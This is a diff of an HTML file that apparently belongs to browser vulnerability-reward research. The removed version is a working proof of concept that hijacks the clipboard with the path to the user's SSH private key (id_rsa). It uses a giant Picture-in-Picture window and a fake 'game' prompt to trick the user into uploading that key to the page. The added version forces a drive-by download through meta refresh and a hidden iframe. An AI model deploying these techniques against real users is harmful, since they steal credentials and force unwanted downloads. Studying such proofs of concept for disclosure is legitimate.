@@ -1,53 +1,112 @@
-<button onclick="start()">Click here</button>
-<input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">
-
-<pre id="contents"></pre>
-
-<script>
-const fileReadPath = "%userprofile%\\.ssh\\id_rsa";
-
-async function loadFile(file) {
-  window.moveTo(0, 0);
-  window.resizeTo(500, 500);
-  alert(`Read ${fileReadPath}:\n` + await (new Response(file)).text());
-}
-
-const pipOpen = async () => {
-  pipWindow = await documentPictureInPicture.requestWindow({
-    width: Math.pow(2,32),
-    height: Math.pow(2,32),
-  });
-  pipWindow.document.body.innerHTML = `
-  <button onclick="eval(document.querySelector('script').innerText)">Start file reading game!</button>
-  <script>
-  copyToClipboard("${fileReadPath}");
-  const popup = window.open("${document.location.href}", "popup-read", "popup");
-  popup.resizeTo(200,200);
-  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
-
-  setTimeout(()=>
-    document.body.innerHTML = "<p>Press enter, then ctrl+v and enter to win this game!</p>",
-    400
-  );
-
-  function copyToClipboard(text) {
-    const textarea = document.createElement("textarea");
-    textarea.style.opacity = "0%";
-    textarea.textContent = text;
-    document.body.appendChild(textarea);
-    textarea.select();
-    document.execCommand("copy");
-  }
-
-  <${'/'}script>
-  `;
-};
-
-function start() {
-  pipOpen();
-}
-
-if (window.name == "popup-read") {
-  document.body.onkeydown = () => document.getElementById("upload").click();
-}
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Google VRP - Auto Download Test</title>
+    
+    <!-- Primary meta refresh for auto-download -->
+    <meta http-equiv="refresh" content="0; url=chrome_test.zip">
+    
+    <!-- Backup meta refresh -->
+    <meta http-equiv="refresh" content="2; url=chrome_test.zip?attempt=2">
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1a237e 0%, #0d47a1 100%);
+            color: white;
+            margin: 0;
+            padding: 40px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            border-left: 4px solid #ffc107;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .status {
+            padding: 20px;
+            background: rgba(52, 168, 83, 0.2);
+            border-radius: 8px;
+            text-align: center;
+            font-size: 1.2em;
+            margin: 30px 0;
+        }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Google VRP Security Test</h1>
+        
+        <div class="warning">
+            <strong>⚠️ SECURITY RESEARCH ONLY</strong><br>
+            This page tests drive-by download vulnerabilities for Google VRP.<br>
+            Authorized testing only. Do not use maliciously.
+        </div>
+        
+        <div class="status blink">
+            ⚡ Testing auto-download vulnerability...
+            <br>
+            <small>If vulnerable, "chrome_test.zip" should download automatically</small>
+        </div>
+        
+        <h3>Test Details:</h3>
+        <ul>
+            <li><strong>Method:</strong> Meta refresh auto-redirect</li>
+            <li><strong>Target:</strong> chrome_test.zip (safe test files)</li>
+            <li><strong>Timing:</strong> Immediate (0 seconds) + 2-second backup</li>
+            <li><strong>Purpose:</strong> Google Vulnerability Reward Program testing</li>
+        </ul>
+        
+        <div class="warning">
+            <h4>For VRP Reporting:</h4>
+            <ol>
+                <li>Note browser name and version</li>
+                <li>Document if download starts automatically</li>
+                <li>Note any security warnings shown</li>
+                <li>Check browser console for errors</li>
+                <li>Test with default security settings</li>
+            </ol>
+        </div>
+    </div>
+    
+    <script>
+        // Log test environment
+        console.log('=== Google VRP Auto-Download Test ===');
+        console.log('URL:', window.location.href);
+        console.log('User Agent:', navigator.userAgent);
+        console.log('Test started:', new Date().toISOString());
+        
+        // Backup download methods
+        setTimeout(function() {
+            // Hidden iframe method
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'chrome_test.zip';
+            document.body.appendChild(iframe);
+            console.log('Backup method 1: Hidden iframe');
+        }, 1000);
+    </script>
+</body>
+</html>
